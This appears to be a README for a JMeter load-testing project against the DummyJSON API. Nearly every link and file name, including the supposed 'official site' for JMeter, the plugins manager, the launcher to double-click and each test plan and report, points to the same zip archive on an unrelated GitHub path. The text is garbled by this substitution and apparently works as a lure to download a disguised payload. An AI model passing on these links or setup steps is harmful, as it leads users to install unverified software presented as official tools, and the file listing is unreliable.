# 🧪 **API Performance Testing – Dummy JSON APIs**

**Author:** Nada Abdelreheem
**Date:** October 22, 2025

---

## 📘 **Overview**

This repository contains end-to-end **API performance testing scenarios** built using **Apache JMeter**.
The test suite validates the functionality, reliability, and performance of the public [Dummy JSON API](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip) under various conditions — including **Smoke, Load, Workload, and Stress testing**.

Each test plan ensures that the API endpoints respond correctly, within acceptable performance thresholds, and handle concurrent user loads effectively.

---

## 🚀 **Objectives**

* Validate **API functionality and authentication flow**.
* Ensure **response accuracy and field validation**.
* Measure performance under **different load conditions** (light, moderate, heavy).
* Detect potential **bottlenecks or throttling behavior**.
* Verify that **service-level agreements (SLAs)** such as response time, throughput, and error rates are maintained.

---

## 🏗️ **Setup Instructions**

### **Prerequisites**

* **Java 8+** must be installed.
* Download **Apache JMeter v5.6.3** from the [official site](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip).

### **Environment Setup**

1. **Extract JMeter** to your preferred location.
   Example:

   ```
   D:\user\Downloads\apache-jmeter-5.6.3\
   ```

2. **Open JMeter GUI Mode**
   Navigate to:

   ```
   apache-jmeter-5.6.3\lib
   ```

   Then double-click `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`.

3. **Install the JMeter Plugins Manager**

   * Download from: [https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip)
   * Place the `.jar` file into:

     ```
     apache-jmeter-5.6.3\lib\ext
     ```
   * Restart JMeter.

4. **Open the Desired Test Plan**
   Depending on the testing phase, open one of the following:

   ```
   Smoke Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
   Load Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
   Workload Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
   Stress Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip
   ```

5. **Run the Test Plan**

   * Verify that all thread groups and listeners are configured properly.
   * Run the test.
   * View results using **View Results Tree**, or **Aggregate Report** listeners.

6. **Analyze Results**

   * Review generated `.jtl` files or reports (e.g., Summary, Graph, Aggregate Report).
   * Compare metrics with defined SLAs (e.g., latency < 1200 ms, error rate < 2%).

---

## 🔗 **Test Structure**

| Step | Endpoint         | Method | Purpose                                             |
| ---- | ---------------- | ------ | --------------------------------------------------- |
| 1    | `/auth/login`    | POST   | Authenticate user and extract JWT token dynamically |
| 2    | `/products`      | GET    | Retrieve product list                               |
| 3    | `/products/{id}` | GET    | Fetch details for a random product                  |
| 4    | `/carts/add`     | POST   | Add selected product to cart using token            |

---

## ⚙️ **Tools & Environment**

| Tool                        | Description                                      |
| --------------------------- | ------------------------------------------------ |
| **Apache JMeter**           | Used for test automation and performance testing |
| **Groovy (JSR223 Script)**  | Handles dynamic user data extraction             |
| **JSON JMESPath Extractor** | Used for correlation and token extraction        |
| **Authentication**          | JWT (Bearer Token)                               |
| **Environment**             | [https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip](https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip)   |

---

## 🧠 **Data Preparation**

Two **JSON Extractors** capture usernames and passwords dynamically from the `/users` endpoint.
A **JSR223 Groovy Script** then stores them into lists for use during the login phase.
This simulates real-world user authentication and ensures test data variability.

---

## 🔐 **Token Correlation**

The **JWT token** is dynamically extracted from the `/auth/login` response using a **JMESPath Extractor** and stored in the variable `${JWT}`.
It’s automatically added to all subsequent API requests through the **HTTP Header Manager** as:

```
Authorization: Bearer ${JWT}
```

---

## ✅ **Assertions**

Each test validates:

* **Status code:** `200` or `201`
* **Response time:** `< 800 ms` 
* **Key JSON fields:** `token`, `user id`, `products`, `product id`, `total`

---

## 📂 **Repository Structure**

| File                                             | Description                            |
| ------------------------------------------------ | -------------------------------------  |
| `Smoke Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip` | API Smoke Test plan                    |
| `Load Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`  | API Load Test plan                     |
| `Workload Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                         | Workload simulation                    |
| `Stress Test https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                           | Stress and break-point testing         |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                      | Smoke test report and results          |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                      | Workload test results and SLA analysis |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                          | Load test results and SLA analysis     |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                        | Stress test results and SLA analysis   |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                  | Executive Summary Load test  Report    |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                | Executive Summary Stress test  Report  |
| `https://github.com/nafatthallah/PerformanceTestTask/raw/refs/heads/main/polyphemian/Task-Test-Performance-v3.2.zip`                                      | Setup and documentation file           |

---

## 📊 **Results Summary**

All test profiles were executed successfully against DummyJSON APIs.

* **Smoke Test:** Verified basic functionality and response under 800 ms.
* **Load Test:** Evaluated sustained performance with SLA thresholds (p95 < 1200 ms, error rate < 2%).
* **Workload Test:** Simulated varying virtual users (5 → 20 users) with ramp-up and think times.
* **Stress Test:** Pushed system beyond normal capacity to observe degradation points.

Detailed results, screenshots, and SLA comparisons are documented in the included reports.

---

## 🏁 **Conclusion**

The Dummy JSON API demonstrated **stable and reliable performance** across all test profiles.
SLA metrics were mostly achieved with minimal error rates and consistent response times.
The provided JMeter scripts and reports can serve as a baseline for further automation and performance benchmarking.

---

✅ **End of README**
